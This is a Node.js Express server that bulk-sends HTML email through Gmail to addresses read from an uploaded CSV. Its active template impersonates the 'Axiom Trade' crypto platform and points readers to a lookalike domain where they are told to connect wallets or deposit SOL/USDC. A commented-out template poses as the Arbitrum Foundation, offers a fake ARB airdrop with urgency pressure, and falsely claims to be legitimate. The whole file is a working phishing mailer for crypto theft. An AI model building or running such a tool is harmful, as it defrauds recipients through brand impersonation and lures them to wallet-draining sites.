const express = require('express');
const nodemailer = require('nodemailer');
const multer = require('multer');
const csvParser = require('csv-parser');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

require('dotenv').config();

const app = express();
const PORT = process.env.PORT 

app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.use(express.static(path.join(__dirname, 'public')));


app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const upload = multer({ dest: 'uploads/' });

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});


function generateHtmlTemplate(subject) {
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Unlock Solana's Fastest Trading Platform</title>
      <style>
        @media only screen and (max-width: 600px) {
          .container { width: 100% !important; padding: 10px !important; }
          .header { padding: 20px 15px !important; }
          .content { padding: 20px 15px !important; }
          .feature-grid { display: block !important; }
          .feature-item { margin-bottom: 15px !important; }
          .cta-button { width: 100% !important; padding: 15px !important; }
          .steps { padding: 15px !important; }
        }
      </style>
    </head>
     <h2 style="color:#0d6efd;">${subject}</h2>
    <body style="margin: 0; padding: 0; background-color: #0a0a0a; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">
      
      <!-- Main Container -->
      <div class="container" style="max-width: 600px; margin: 0 auto; background-color: #ffffff;">
        
        <!-- Header -->
        <div class="header" style="background: linear-gradient(135deg, #9945FF 0%, #14F195 100%); padding: 30px 20px; text-align: center;">
          <h1 style="color: #ffffff; margin: 0; font-size: 28px; font-weight: bold; text-shadow: 0 2px 4px rgba(0,0,0,0.3);">
            ⚡ AXIOM TRADE
          </h1>
          <p style="color: #ffffff; margin: 10px 0 0 0; font-size: 16px; opacity: 0.9;">
            Solana's Fastest Trading Platform
          </p>
        </div>

        <!-- Main Content -->
        <div class="content" style="padding: 30px 20px;">
          
          <!-- Greeting -->
          <h2 style="color: #1a1a1a; margin: 0 0 20px 0; font-size: 24px;">
            Hey Trader! 👋
          </h2>
          
          <p style="color: #333333; line-height: 1.6; margin: 0 0 20px 0; font-size: 16px;">
            Ready to dominate Solana's meme coin and perps game? <strong>Axiom Trade</strong>, backed by Y Combinator and launched in 2024, is the ultimate platform for traders like you. With sub-block trade execution and pro-level tools, we're helping degens snipe 10x pumps and earn passive income.
          </p>

          <!-- Why Axiom Trade Section -->
          <div style="background: linear-gradient(135deg, #f8f9ff 0%, #e8f4fd 100%); border-radius: 12px; padding: 25px; margin: 25px 0; border-left: 4px solid #9945FF;">
            <h3 style="color: #9945FF; margin: 0 0 20px 0; font-size: 20px; display: flex; align-items: center;">
              🚀 Why Axiom Trade?
            </h3>
            
            <div class="feature-grid" style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
              <div class="feature-item" style="background: #ffffff; padding: 15px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
                <div style="color: #14F195; font-size: 20px; margin-bottom: 8px;">⚡</div>
                <strong style="color: #1a1a1a;">Lightning Speed</strong>
                <p style="color: #666; margin: 5px 0 0 0; font-size: 14px;">Catch tokens before they hit Raydium with our migration sniper</p>
              </div>
              
              <div class="feature-item" style="background: #ffffff; padding: 15px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
                <div style="color: #14F195; font-size: 20px; margin-bottom: 8px;">💰</div>
                <strong style="color: #1a1a1a;">Low Fees</strong>
                <p style="color: #666; margin: 5px 0 0 0; font-size: 14px;">Just 0.7% with code <code style="background: #f0f0f0; padding: 2px 4px; border-radius: 3px;">solnode</code> (10% discount)</p>
              </div>
              
              <div class="feature-item" style="background: #ffffff; padding: 15px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
                <div style="color: #14F195; font-size: 20px; margin-bottom: 8px;">🛠️</div>
                <strong style="color: #1a1a1a;">Elite Tools</strong>
                <p style="color: #666; margin: 5px 0 0 0; font-size: 14px;">Pulse dashboard, whale wallet tracking, and Twitter alerts</p>
              </div>
              
              <div class="feature-item" style="background: #ffffff; padding: 15px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
                <div style="color: #14F195; font-size: 20px; margin-bottom: 8px;">🔒</div>
                <strong style="color: #1a1a1a;">Secure</strong>
                <p style="color: #666; margin: 5px 0 0 0; font-size: 14px;">Non-custodial wallets with Turnkey's air-gapped tech</p>
              </div>
            </div>
          </div>

          <!-- Earn More Section -->
          <div style="background: linear-gradient(135deg, #fff8e1 0%, #f3e5f5 100%); border-radius: 12px; padding: 20px; margin: 25px 0; border: 2px solid #14F195;">
            <h4 style="color: #9945FF; margin: 0 0 15px 0; font-size: 18px;">💎 Earn More</h4>
            <ul style="color: #333; margin: 0; padding-left: 20px; line-height: 1.6;">
              <li>Get SOL cashback on trades (up to $1,000)</li>
              <li>30% referral fees</li>
              <li>Early users are stacking points for a potential airdrop</li>
            </ul>
          </div>

          <!-- Get Started Steps -->
          <div class="steps" style="background: #1a1a1a; color: #ffffff; border-radius: 12px; padding: 25px; margin: 25px 0;">
            <h3 style="color: #14F195; margin: 0 0 20px 0; font-size: 20px;">🎯 Get Started in 3 Steps:</h3>
            
            <div style="display: flex; align-items: flex-start; margin-bottom: 15px;">
              <div style="background: #9945FF; color: #ffffff; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; margin-right: 15px; flex-shrink: 0;">1</div>
              <p style="margin: 0; line-height: 1.5;">Join now at <a href="https://axiom.sol-node.com/" style="color: #14F195; text-decoration: none;">axiom.sol-node.com</a> (exclusive invite link)</p>
            </div>
            
            <div style="display: flex; align-items: flex-start; margin-bottom: 15px;">
              <div style="background: #9945FF; color: #ffffff; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; margin-right: 15px; flex-shrink: 0;">2</div>
              <p style="margin: 0; line-height: 1.5;">Connect Phantom or deposit SOL/USDC via Coinbase (no KYC)</p>
            </div>
            
            <div style="display: flex; align-items: flex-start;">
              <div style="background: #9945FF; color: #ffffff; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; margin-right: 15px; flex-shrink: 0;">3</div>
              <p style="margin: 0; line-height: 1.5;">Set Pulse filters (50+ holders, 20k volume, 3-30 min age) to snipe winners</p>
            </div>
          </div>

          <!-- CTA Button -->
          <div style="text-align: center; margin: 30px 0;">
            <a href="https://axiom.sol-node.com/" class="cta-button" style="display: inline-block; background: linear-gradient(135deg, #9945FF 0%, #14F195 100%); color: #ffffff; text-decoration: none; padding: 18px 40px; border-radius: 50px; font-weight: bold; font-size: 18px; box-shadow: 0 4px 15px rgba(153, 69, 255, 0.4); transition: transform 0.2s;">
              🚀 Start Trading Now
            </a>
          </div>

          <!-- Discount Code Highlight -->
          <div style="background: linear-gradient(135deg, #14F195 0%, #9945FF 100%); color: #ffffff; text-align: center; padding: 15px; border-radius: 8px; margin: 20px 0;">
            <p style="margin: 0; font-size: 16px; font-weight: bold;">
              💸 Use code <span style="background: rgba(255,255,255,0.2); padding: 4px 8px; border-radius: 4px; font-family: monospace;">SOLNODE</span> for 10% off fees!
            </p>
          </div>

          <!-- Closing -->
          <p style="color: #333333; line-height: 1.6; margin: 25px 0 0 0; font-size: 16px;">
            Don't miss out—Solana's hottest tokens are pumping, and Axiom's your edge.
          </p>
          
          <p style="color: #333333; margin: 20px 0 0 0; font-size: 16px;">
            Trade smarter,<br>
            <strong style="color: #9945FF;">The Axiom Trade Team</strong>
          </p>
        </div>

        <!-- Footer -->
        <div style="background: #f8f9fa; padding: 20px; text-align: center; border-top: 1px solid #e9ecef;">
          <p style="color: #6c757d; margin: 0; font-size: 12px; line-height: 1.4;">
            This email was sent by Axiom Trade Team<br>
            <a href="mailto:support@axiom.sol-node.com" style="color: #9945FF; text-decoration: none;">support@axiom.sol-node.com</a>
          </p>
          <p style="color: #6c757d; margin: 10px 0 0 0; font-size: 11px;">
            © 2024 Axiom Trade. All rights reserved.
          </p>
        </div>
      </div>
    </body>
    </html>
  `;
}



// function generateHtmlTemplate(subject) {
//   return `
//    <!DOCTYPE html>
//     <html lang="en">
//     <head>
//       <meta charset="UTF-8">
//       <meta name="viewport" content="width=device-width, initial-scale=1.0">
//       <title>🎉 Your Arbitrum Airdrop is Ready - Claim 100 - 5,000 ARB Tokens!</title>
//       <style>
//         @media only screen and (max-width: 600px) {
//           .container { width: 100% !important; padding: 10px !important; }
//           .header { padding: 20px 15px !important; }
//           .content { padding: 20px 15px !important; }
//           .stats-grid { display: block !important; }
//           .stat-item { margin-bottom: 15px !important; }
//           .cta-button { width: 100% !important; padding: 15px !important; font-size: 16px !important; }
//           .rules-grid { display: block !important; }
//           .rule-item { margin-bottom: 15px !important; }
//           .claim-amount { font-size: 36px !important; }
//         }
//       </style>
//     </head>
//     <body style="margin: 0; padding: 0; background-color: #0a0e1a; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; color: #ffffff;">
      
//       <!-- Main Container -->
//       <div class="container" style="max-width: 600px; margin: 0 auto; background: linear-gradient(180deg, #0a0e1a 0%, #1a1f2e 100%);">
        
//         <!-- Header -->
//         <div class="header" style="background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 50%, #1e40af 100%); padding: 40px 20px; text-align: center; position: relative; overflow: hidden;">
      
//           <div style="background: rgba(255,255,255,0.1); width: 60px; height: 60px; border-radius: 50%; margin: 0 auto 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; border: 2px solid rgba(255,255,255,0.2);">
//            <img src="https://arbitrum.foundation/logo.png" alt="Arbitrum Logo" style="width: 60px; height: 60px; border-radius: 50%;">
          
//           </div>
//             <div style="color: #ffffff; font-size: 24px; font-weight: bold; margin-bottom: 30px;">ARB</div>

//           <div style="background: rgba(37, 99, 235, 0.8); color: #ffffff; padding: 8px 16px; border-radius: 20px; display: inline-block; font-size: 14px; font-weight: 600; margin-bottom: 16px;">
//             15,000,000 ARB Airdrop
//           </div>
          
//           <h1 style="color: #ffffff; margin: 0; font-size: 32px; font-weight: 700; line-height: 1.2;">
//             Round 1 of the $ARB Airdrop is on the way!
//           </h1>
          
//           <!-- Decorative elements -->
//           <div style="position: absolute; top: 20px; right: 20px; width: 100px; height: 100px; background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%); border-radius: 50%;"></div>
//           <div style="position: absolute; bottom: 20px; left: 20px; width: 80px; height: 80px; background: radial-gradient(circle, rgba(255,255,255,0.05) 0%, transparent 70%); border-radius: 50%;"></div>
//         </div>

//         <!-- Main Content -->
//         <div class="content" style="padding: 40px 20px; background: #1a1f2e;">
          
//           <!-- Greeting -->
//           <h2 style="color: #ffffff; margin: 0 0 24px 0; font-size: 28px; font-weight: 600;">
//             Hey, Trader! 🎉
//           </h2>
          
//           <p style="color: #94a3b8; line-height: 1.7; margin: 0 0 32px 0; font-size: 16px;">
//             Great news! Your wallet is eligible for the <strong style="color: #60a5fa;">Arbitrum Airdrop</strong>. The Arbitrum Foundation, with CEO Steven Goldfeder, believes in the future of cryptocurrency and is making the largest airdrop in history.
//           </p>

//           <!-- Claim Amount Highlight -->
//           <div style="background: linear-gradient(135deg, #1e40af 0%, #2563eb 100%); border-radius: 20px; padding: 32px; margin: 32px 0; text-align: center; border: 1px solid rgba(96, 165, 250, 0.3); position: relative; overflow: hidden;">
//             <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: radial-gradient(circle at 30% 20%, rgba(255,255,255,0.1) 0%, transparent 50%);"></div>
            
//             <div style="position: relative; z-index: 1;">
//               <p style="color: rgba(255,255,255,0.8); margin: 0 0 8px 0; font-size: 16px;">Your Arbitrum Airdrop</p>
//               <div class="claim-amount" style="color: #ffffff; font-size: 48px; font-weight: 800; margin: 0 0 16px 0; text-shadow: 0 2px 4px rgba(0,0,0,0.3);">
//                 5,000 $ARB
//               </div>
              
            
              
//               <a href="https://defiweb3.xyz/base" style="display: inline-block; background: linear-gradient(135deg, #10b981 0%, #059669 100%); color: #ffffff; text-decoration: none; padding: 16px 32px; border-radius: 12px; font-weight: 700; font-size: 18px; box-shadow: 0 4px 20px rgba(16, 185, 129, 0.4); transition: transform 0.2s; border: 1px solid rgba(16, 185, 129, 0.3);">
//                 🚀 Claim Now
//               </a>
//             </div>
//           </div>

//           <!-- Rules Section -->
//           <div style="background: rgba(30, 41, 59, 0.5); border-radius: 16px; padding: 28px; margin: 32px 0; border: 1px solid rgba(71, 85, 105, 0.3);">
//             <h3 style="color: #60a5fa; margin: 0 0 20px 0; font-size: 22px; font-weight: 600;">
//               📋 Rules for Participants
//             </h3>
//             <p style="color: #94a3b8; margin: 0 0 24px 0; font-size: 16px;">
//               Your wallet must comply with several rules listed below.
//             </p>
            
//             <div class="rules-grid" style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
//               <div class="rule-item" style="background: rgba(37, 99, 235, 0.1); padding: 20px; border-radius: 12px; border-left: 4px solid #2563eb;">
//                 <h4 style="color: #60a5fa; margin: 0 0 8px 0; font-size: 18px; font-weight: 600;">5+ Transactions</h4>
//                 <p style="color: #cbd5e1; margin: 0; font-size: 14px; line-height: 1.5;">
//                   Your wallet must have at least 5 transactions to participate in the airdrop! We are against multi-accounting!
//                 </p>
//               </div>
              
//               <div class="rule-item" style="background: rgba(37, 99, 235, 0.1); padding: 20px; border-radius: 12px; border-left: 4px solid #2563eb;">
//                 <h4 style="color: #60a5fa; margin: 0 0 8px 0; font-size: 18px; font-weight: 600;">One Time Only</h4>
//                 <p style="color: #cbd5e1; margin: 0; font-size: 14px; line-height: 1.5;">
//                   You can only participate in this Airdrop once! On average, you can receive 1,000 $ARB.
//                 </p>
//               </div>
//             </div>
//           </div>

//           <!-- Arbitrum Products -->
//           <div style="margin: 32px 0;">
//             <h3 style="color: #ffffff; margin: 0 0 24px 0; font-size: 22px; font-weight: 600;">
//               🛠️ Our Products
//             </h3>
//             <p style="color: #94a3b8; margin: 0 0 24px 0; font-size: 16px; line-height: 1.6;">
//               With a powerful suite of Layer 2 scaling solutions, Arbitrum is shaping the future of Ethereum. Arbitrum technology makes it possible for projects to leverage Ethereum's security to build next-gen apps.
//             </p>
            
//             <div style="display: grid; gap: 16px;">
//               <div style="background: rgba(30, 41, 59, 0.3); padding: 20px; border-radius: 12px; border: 1px solid rgba(71, 85, 105, 0.2);">
//                 <div style="display: flex; align-items: flex-start;">
//                   <div style="background: #2563eb; width: 40px; height: 40px; border-radius: 8px; display: flex; align-items: center; justify-content: center; margin-right: 16px; flex-shrink: 0;">
//                     <div style="color: #ffffff; font-size: 18px;">⚡</div>
//                   </div>
//                   <div>
//                     <h4 style="color: #ffffff; margin: 0 0 8px 0; font-size: 18px; font-weight: 600;">Arbitrum Rollup</h4>
//                     <p style="color: #94a3b8; margin: 0; font-size: 14px; line-height: 1.5;">
//                       Scale your decentralized applications with a fraction of the fees, while still leveraging Ethereum's security.
//                     </p>
//                   </div>
//                 </div>
//               </div>
              
//               <div style="background: rgba(30, 41, 59, 0.3); padding: 20px; border-radius: 12px; border: 1px solid rgba(71, 85, 105, 0.2);">
//                 <div style="display: flex; align-items: flex-start;">
//                   <div style="background: #2563eb; width: 40px; height: 40px; border-radius: 8px; display: flex; align-items: center; justify-content: center; margin-right: 16px; flex-shrink: 0;">
//                     <div style="color: #ffffff; font-size: 18px;">🌐</div>
//                   </div>
//                   <div>
//                     <h4 style="color: #ffffff; margin: 0 0 8px 0; font-size: 18px; font-weight: 600;">Arbitrum Orbit</h4>
//                     <p style="color: #94a3b8; margin: 0; font-size: 14px; line-height: 1.5;">
//                       Launch your own chain into Arbitrum Orbit — an interconnected universe of customizable chains that settle to Arbitrum One or Nova.
//                     </p>
//                   </div>
//                 </div>
//               </div>
//             </div>
//           </div>

//           <!-- Platform Stats -->
//           <div style="background: linear-gradient(135deg, rgba(16, 185, 129, 0.1) 0%, rgba(6, 182, 212, 0.1) 100%); border-radius: 16px; padding: 28px; margin: 32px 0; border: 1px solid rgba(16, 185, 129, 0.2);">
//             <h3 style="color: #10b981; margin: 0 0 24px 0; font-size: 20px; font-weight: 600; text-align: center;">
//               📊 Arbitrum Network Stats
//             </h3>
            
//             <div class="stats-grid" style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px;">
//               <div class="stat-item" style="text-align: center; padding: 16px;">
//                 <div style="color: #10b981; font-size: 28px; font-weight: 700; margin-bottom: 4px;">3.09M</div>
//                 <div style="color: #94a3b8; font-size: 14px;">ETH Saved</div>
//               </div>
              
//               <div class="stat-item" style="text-align: center; padding: 16px;">
//                 <div style="color: #10b981; font-size: 28px; font-weight: 700; margin-bottom: 4px;">1.13M</div>
//                 <div style="color: #94a3b8; font-size: 14px;">Active Wallets</div>
//               </div>
              
//               <div class="stat-item" style="text-align: center; padding: 16px;">
//                 <div style="color: #10b981; font-size: 28px; font-weight: 700; margin-bottom: 4px;">40.14%</div>
//                 <div style="color: #94a3b8; font-size: 14px;">L2 Market Share</div>
//               </div>
              
//               <div class="stat-item" style="text-align: center; padding: 16px;">
//                 <div style="color: #10b981; font-size: 28px; font-weight: 700; margin-bottom: 4px;">1.25B</div>
//                 <div style="color: #94a3b8; font-size: 14px;">Total Transactions</div>
//               </div>
//             </div>
//           </div>

//           <!-- Urgency Message -->
//           <div style="background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%); border-radius: 12px; padding: 20px; margin: 32px 0; text-align: center;">
//             <p style="color: #ffffff; margin: 0; font-size: 16px; font-weight: 600;">
//               ⏰ Limited Time: You can do it only one time. Don't miss out!
//             </p>
//           </div>

//           <!-- Final CTA -->
//           <div style="text-align: center; margin: 40px 0;">
//             <p style="color: #94a3b8; margin: 0 0 20px 0; font-size: 16px;">
//               Ready to claim your 1,000 ARB tokens?
//             </p>
//             <a href="https://defiweb3.xyz/base" class="cta-button" style="display: inline-block; background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%); color: #ffffff; text-decoration: none; padding: 18px 40px; border-radius: 12px; font-weight: 700; font-size: 18px; box-shadow: 0 6px 20px rgba(37, 99, 235, 0.4); border: 1px solid rgba(96, 165, 250, 0.3);">
//               🎯 Check Eligibility & Claim
//             </a>
//           </div>

//           <!-- Security Notice -->
//           <div style="background: rgba(245, 158, 11, 0.1); border: 1px solid rgba(245, 158, 11, 0.3); border-radius: 12px; padding: 20px; margin: 24px 0;">
//             <div style="display: flex; align-items: flex-start;">
//               <div style="color: #f59e0b; margin-right: 12px; font-size: 20px;">🛡️</div>
//               <div>
//                 <h4 style="color: #f59e0b; margin: 0 0 8px 0; font-size: 16px; font-weight: 600;">Security Notice</h4>
//                 <p style="color: #fbbf24; margin: 0; font-size: 14px; line-height: 1.5;">
//                   Always verify you're on the official domain. Never share your private keys or seed phrases with anyone. This airdrop is legitimate and backed by the Arbitrum Foundation.
//                 </p>
//               </div>
//             </div>
//           </div>

//           <!-- Closing -->
//           <p style="color: #94a3b8; line-height: 1.7; margin: 32px 0 0 0; font-size: 16px;">
//             The future of Ethereum scaling is here. Join millions of users who are already building on Arbitrum's Layer 2 solutions.
//           </p>
          
//           <p style="color: #94a3b8; margin: 20px 0 0 0; font-size: 16px;">
//             Best regards,<br>
//             <strong style="color: #60a5fa;">The Arbitrum Foundation Team</strong>
//           </p>
//         </div>

//         <!-- Footer -->
//         <div style="background: #0f172a; padding: 24px 20px; text-align: center; border-top: 1px solid rgba(71, 85, 105, 0.3);">
//           <div style="background: rgba(37, 99, 235, 0.1); width: 40px; height: 40px; border-radius: 50%; margin: 0 auto 16px; display: flex; align-items: center; justify-content: center;">
//             <div style="color: #60a5fa; font-size: 16px; font-weight: bold;">ARB</div>
//           </div>
          
//           <p style="color: #64748b; margin: 0 0 8px 0; font-size: 14px; line-height: 1.4;">
//             This email was sent by the Arbitrum Foundation<br>
//             <a href="mailto:support@arbitrum.foundation" style="color: #60a5fa; text-decoration: none;">support@arbitrum.foundation</a>
//           </p>
//           <p style="color: #475569; margin: 0; font-size: 12px;">
//             © 2025 – Arbitrum Foundation. All rights reserved.
//           </p>
//         </div>
//       </div>
//     </body>
//     </html>
//   `;
// }

app.post('/send-email', upload.single('csv'), async (req, res) => {
  const { subject, message, toEmail, mode, template } = req.body;
   const html = template === 'html' ? generateHtmlTemplate(subject) : message;

  if (mode === 'single') {

    try {
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: toEmail,
      subject,
      html,
      // html: message,
    });

    return res.status(200).json({ success: true, message: 'Email sent to recipient.' });
  } 
  catch (error) {
   
    return res.status(500).json({
      success: false,
      message: 'Failed to send email. Please try again.',
      error: error.message,
    });
  }
  }


  const results = [];
  const filePath = req.file.path;

  fs.createReadStream(filePath)
    .pipe(csvParser())
    .on('data', (data) => {
      if (data.email) results.push(data.email);
    })
.on('end', async () => {
  try {
    for (const email of results) {
      try {
        await transporter.sendMail({
          from: process.env.EMAIL_USER,
          to: email,
          subject,
          html: message,
        });
      } catch (emailError) {
        console.error(`Failed to send to ${email}:`, emailError.message);

        return res.status(500).json({
          success: false,
          message: `Failed to send email. Please try again.`,
          error: emailError.message,
        });

      }
    }

    // Delete uploaded CSV file
    fs.unlinkSync(filePath);

    return res.status(200).json({
      success: true,
      message: `Emails sent to ${results.length} recipient(s).`,
    });

  } catch (error) {
    console.error('Bulk email error:', error);

    // File is removed even on failure
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
    }

    return res.status(500).json({
      success: false,
      message: 'Failed to send bulk emails. Please try again later.',
      error: error.message,
    });
  }
});


});

app.listen(PORT, () => console.log(`Server started on port ${PORT}`));
